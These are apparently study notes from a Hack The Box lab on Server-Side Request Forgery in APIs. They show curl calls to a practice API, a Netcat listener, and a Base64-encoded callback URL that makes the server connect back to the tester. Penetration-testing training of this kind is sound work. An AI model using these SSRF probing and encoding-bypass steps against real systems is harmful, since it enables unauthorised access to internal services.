Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:

- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution

We can usually find SSRF vulnerabilities in applications or APIs that fetch remote resources. OurÂ [Server-side Attacks](https://academy.hackthebox.com/module/details/145)Â module covers SSRF in detail.

As we have mentioned multiple times, though, we should fuzz every identified parameter, even if it does not seem tasked with fetching remote resources.

Let us assess together an API that is vulnerable to SSRF.

Proceed to the end of this section and click onÂ `Click here to spawn the target system!`Â or theÂ `Reset Target`Â icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target API and follow along.

Suppose we are assessing such an API residing inÂ `http://<TARGET IP>:3000/api/userinfo`.

Let us first interact with it.


```shell-session
smoothment@htb[/htb]$ curl http://<TARGET IP>:3000/api/userinfo
{"success":false,"error":"'id' parameter is not given."}
```

The API is expecting a parameter calledÂ _id_. Since we are interested in identifying SSRF vulnerabilities in this section, let us set up a Netcat listener first.

```shell-session
smoothment@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
```

Then, let us specifyÂ `http://<VPN/TUN Adapter IP>:<LISTENER PORT>`Â as the value of theÂ _id_Â parameter and make an API call.


```shell-session
smoothment@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
{"success":false,"error":"'id' parameter is invalid."}
```

We notice an error about theÂ _id_Â parameter being invalid, and we also notice no connection being made to our listener.

In many cases, APIs expect parameter values in a specific format/encoding. Let us try Base64-encodingÂ `http://<VPN/TUN Adapter IP>:<LISTENER PORT>`Â and making an API call again.


```shell-session
smoothment@htb[/htb]$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
smoothment@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```

When you make the API call, you will notice a connection being made to your Netcat listener. The API is vulnerable to SSRF.


```shell-session
smoothment@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 50542
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.24.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close
```

# Question
---
![Pasted image 20250219172102.png](../../../../IMAGES/Pasted%20image%2020250219172102.png)

